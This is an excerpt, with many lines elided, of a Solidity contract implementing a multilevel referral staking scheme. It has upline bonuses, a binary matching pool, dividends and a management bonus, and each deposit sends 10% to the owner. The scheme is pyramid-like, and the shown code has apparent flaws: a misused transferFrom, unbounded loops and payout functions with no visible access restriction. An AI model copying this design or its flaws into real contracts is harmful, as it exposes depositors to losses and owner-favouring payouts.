...
contract Oracle is Ownable {
    ...
    mapping(address => uint256) public _manageDepositedAmount;
    ...
    function deposit(address _upline, uint256 amount) external  {
        ...
        stakingToken.transferFrom(address(this), owner(), amount.div(10)); // 10 % tokens
        _depositedAmount[msg.sender] = _depositedAmount[msg.sender].add(addedAmount);

        if(amount > minimumManageAmount)
        {
            _manageDepositedAmount[msg.sender] =  _manageDepositedAmount[msg.sender].add(addedAmount);
        }
    ...
    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        ...
        if(partners[_upline].length == 0){
            partners[_upline].push(_addr);
            allDistributors.push(_upline);
        }else if(partners[_upline].length < 3) {
            if(partners[_upline][0] != _addr) {
                partners[_upline].push(_addr);
            }
        }else {
            _upline = owner();
        ...
        address _ref_nextAddress;
        address _ref_preAddress = _addr;
        for(uint16 i = 0; i < ref_bonuses.length; i++) {
            uint256 bonus = _amount.mul(ref_bonuses[i]).div(PERCENT);
            if(_ref_preAddress != address(0) && _ref_preAddress != owner())
            {
                _ref_nextAddress = _ref_address[_ref_preAddress];
            }else{
                _ref_nextAddress = owner();
            }
            _rewardAmount[_ref_nextAddress] += bonus;
            _ref_preAddress = _ref_nextAddress;
        }
    ...
    function withdraw() external  {
        ...
        if(_withdrawTime[msg.sender].add(86400) > block.timestamp)
        {
            if( rewardAmount > _depositedAmount[msg.sender].mul(2))
            {
                ...
                _rewardAmount[msg.sender] = _rewardAmount[msg.sender].sub(rewardAmount);
            }else{
    ...
    function BinaryPlan() external {
        ...
        uint256 poolAmount = _totalSupply.mul(30).div(100);
        uint256 totalPoint;
        ...
        for(uint16 i = 0; i < allDistributors.length; i++)
        {
            ...
            if(partners[distributor].length == 2)
            {
                address partner1 = partners[distributor][0];
                address partner2 = partners[distributor][1];
                uint256 pointAmount;
                if(_depositedAmount[partner1] > _depositedAmount[partner2])
                {
                    pointAmount = _depositedAmount[partner2].div(minimumDepositAmount);
                }else{
                    pointAmount = _depositedAmount[partner1].div(minimumDepositAmount);
                }
        ...
        for(uint16 i = 0; i < allDistributors.length; i++)
        {
            ...
            if(partners[distributor].length == 2)
            {
                ...
                _rewardAmount[distributor] += poolAmount.mul(pointAmount).div(totalPoint);
            }
        }
    ...
    function dividendPlan() external {
        ...
        uint256 poolAmount = _totalSupply.mul(12).div(100);
        for(uint16 i = 0; i < allTokenHolders.length; i++)
        {
            address holder;
            holder = allTokenHolders[i];
            uint256 dividendAmount = poolAmount.mul(_depositedAmount[holder]).div(_totalTokenSupply);
            stakingToken.safeTransfer(holder, dividendAmount);
        }
    ...
    function ManagementBonusPlan() external {
        ...
        uint256 poolAmount = _totalSupply.mul(8).div(100);
        uint256 totalPoint;
        ...
        for(uint16 i = 0; i < allManageDistributor.length; i++)
        {
            ...
            if(partners[distributor].length == 2)
            {
                ...
                address partner2 = partners[distributor][1];
                uint256 pointAmount;
                if(_manageDepositedAmount[partner1] > _manageDepositedAmount[partner2])
                {
                    pointAmount = _manageDepositedAmount[partner2].div(minimumManageAmount);
                }else{
                    pointAmount = _manageDepositedAmount[partner1].div(minimumManageAmount);
                }
                totalPoint += pointAmount;
            }
        }
        for(uint16 i = 0; i < allManageDistributor.length; i++)
        {
            ...
            if(partners[distributor].length == 2)
            {
                ...
                {
                    pointAmount = _manageDepositedAmount[partner2].div(minimumManageAmount);
                    _manageDepositedAmount[partner2] = 0;
                }else{
                    pointAmount = _manageDepositedAmount[partner1].div(minimumManageAmount);
                    _manageDepositedAmount[partner1] = 0;
                }
                _rewardAmount[distributor] += poolAmount.mul(pointAmount).div(totalPoint);
            }
        }
